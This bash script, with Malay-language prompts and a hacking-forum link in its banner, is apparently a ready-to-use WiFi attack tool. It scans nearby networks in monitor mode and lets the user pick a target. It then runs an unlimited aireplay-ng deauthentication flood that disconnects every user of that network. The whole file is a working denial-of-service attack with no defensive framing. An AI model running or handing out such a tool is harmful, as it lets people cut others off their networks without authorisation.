#!/bin/bash

clear
Red="\e[1;91m"      ##### Warna Digunakan #####
Green="\e[0;92m"
Yellow="\e[0;93m"
Blue="\e[1;94m"
White="\e[0;97m"

handshakeWait=2      

checkDependencies () {        ##### Menyemak Aircrack #####
if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
echo "Installing aircrack-ng\n\n"
sudo apt-get install aircrack-ng;
fi
}

checkWiFiStatus () {        ##### Periksa Wlan0 Aktif #####
WiFiStatus=`nmcli radio wifi`
if [ "$WiFiStatus" == "disabled" ]; then
nmcli radio wifi on
echo -e "[${Green}wlan0${White}] Enabled!"
fi
}

banner () {        ##### Banner #####
printf "__  ______  ____  __  _______   __
\ \/ /  _ \|  _ \ \ \/ /_ _\ \ / /
 \  /| |_) | |_) | \  / | | \ V / 
 /  \|  _ <|  _ <  /  \ | |  | |  
/_/\_\_| \_\_| \_\/_/\_\___| |_| "
                                                                        
printf " \e[0m\e[30;38;5;82mMenendang\e[30;48;5;82mWiFi\e[0m\n"                                                                        
printf " \e[31;1m Cari saya di : \e[37;1m https://dragonforce.io/members/xrrxiy.2248/  \e[0m\n"

printf " \n"
}

menu () {        ##### Paparkan Rangkaian Yang Ada #####
echo -e "\n${Yellow}                      [ Sila Membuat Pilihan ]\n\n"
echo -e "      ${Red}[${White}1${Red}] ${Green}Menendang WiFi"
echo -e "      ${Red}[${White}2${Red}] ${Green}Keluar\n\n"
while true; do
echo -e "${Green}┌─[${Red}Sila Pilih${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Pilihan 1 Menendang WiFi..."
     MenendangWiFi
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Sila membuat pemilihan yang tepat..\n"
     ;;
esac
done
}

MenendangWiFi () {        ##### Dos Attack #####
monitor
airodump-ng --bssid $bssid --channel $channel wlan0mon > /dev/null & sleep 5 ; kill $!  
echo -e "[${Green}${targetName}${White}] Menendang WiFi Dimulakan , Semua Pengguna Ditendang... "
sleep 0.5
echo -e "[${Green}MenendangWiFi${White}] Tekan CTRL+C Untuk Berhenti dan Keluar.."
aireplay-ng --deauth 0 -a $bssid wlan0mon > /dev/null
}

monitor () {        ##### Monitor mode, periksa dan pilih target#####
spinner &
airmon-ng start wlan0 > /dev/null
trap "airmon-ng stop wlan0mon > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
airodump-ng --output-format kismet --write generated wlan0mon > /dev/null & sleep 20 ; kill $!
sed -i '1d' generated-01.kismet.csv
kill %1
echo -e "\n\n${Red}Nombor        Rangkaian WiFi${White}"
cut -d ";" -f 3 generated-01.kismet.csv | nl -n ln -w 8
targetNumber=1000
while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber} -lt 1 ]; do 
echo -e "\n${Green}┌─[${Red}Pilih WiFi${Green}]──[${Red}~${Green}]─[${Yellow}Rangkaian${Green}]:"
read -p "└─────►$(tput setaf 7) " targetNumber
done
targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
rm generated-01.kismet.csv 2> /dev/null
echo -e "\n[${Green}${targetName}${White}] Bersedia Untuk Menendang..."
}

spinner() {        ##### Animasi Semasa Menyemak #####
sleep 2
echo -e "[${Green}wlan0mon${White}] Bersedia Untuk Menyemak..."
sleep 3
spin='/-\|'
length=${#spin}
while sleep 0.1; do
echo -ne "[${Green}wlan0mon${White}] Menyemak Rangkaian Yang Ada...${spin:i--%length:1}" "\r"
done
}

MenggodamWiFi() {
checkDependencies
checkWiFiStatus
banner
menu
}

MenggodamWiFi